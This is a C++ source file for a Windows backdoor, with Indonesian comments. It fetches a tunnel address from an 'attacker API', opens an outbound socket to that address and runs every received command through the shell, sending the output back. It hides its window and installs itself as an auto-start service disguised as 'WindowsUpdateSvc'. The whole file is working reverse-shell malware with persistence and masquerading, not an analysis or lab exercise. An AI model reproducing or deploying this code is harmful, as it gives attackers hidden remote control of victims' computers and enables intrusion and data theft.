#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <wininet.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

#define ATTACKER_API "http://127.0.0.1:5000"  // API untuk mendapatkan alamat Ngrok
#define SERVICE_NAME "WindowsUpdateSvc"
#define RETRY_DELAY 10000  // 10 detik retry jika gagal koneksi

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

std::string getNgrokAddress() {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    char buffer[1024];
    std::string response;

    hInternet = InternetOpen("NgrokChecker", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    hConnect = InternetOpenUrl(hInternet, ATTACKER_API, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    size_t start = response.find("\"ngrok_address\":\"") + 17;
    size_t end = response.find("\"", start);
    
    if (start != std::string::npos && end != std::string::npos)
        return response.substr(start, end - start);

    return "";
}

void ConnectToServer() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[1024];

    WSAStartup(MAKEWORD(2,2), &wsaData);
    
    while (true) {
        std::string ngrokAddr = getNgrokAddress();
        if (ngrokAddr.empty()) {
            Sleep(RETRY_DELAY);
            continue;
        }

        std::string serverIP = ngrokAddr.substr(0, ngrokAddr.find(":"));
        int serverPort = std::stoi(ngrokAddr.substr(ngrokAddr.find(":") + 1));

        sock = socket(AF_INET, SOCK_STREAM, 0);
        server.sin_family = AF_INET;
        server.sin_port = htons(serverPort);
        inet_pton(AF_INET, serverIP.c_str(), &server.sin_addr);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            while (true) {
                memset(buffer, 0, sizeof(buffer));
                int recvSize = recv(sock, buffer, sizeof(buffer) - 1, 0);
                if (recvSize <= 0) break;
                buffer[recvSize] = '\0';

                FILE* fp = _popen(buffer, "r");
                char output[1024] = {0};
                fread(output, 1, sizeof(output) - 1, fp);
                _pclose(fp);

                send(sock, output, strlen(output), 0);
            }
        }
        closesocket(sock);
        Sleep(RETRY_DELAY);
    }

    WSACleanup();
}

void ServiceMain(int argc, char* argv[]) {
    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, [](DWORD control) {
        if (control == SERVICE_CONTROL_STOP) {
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &ServiceStatus);
            exit(0);
        }
    });

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    HideConsole();
    ConnectToServer();
}

void InstallService() {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    std::string command = "sc create " + std::string(SERVICE_NAME) + 
        " binPath= \"" + path + "\" start= auto";

    system(command.c_str());
}

int main(int argc, char* argv[]) {
    if (argc > 1 && std::string(argv[1]) == "install") {
        InstallService();
        return 0;
    }

    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { (LPSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}
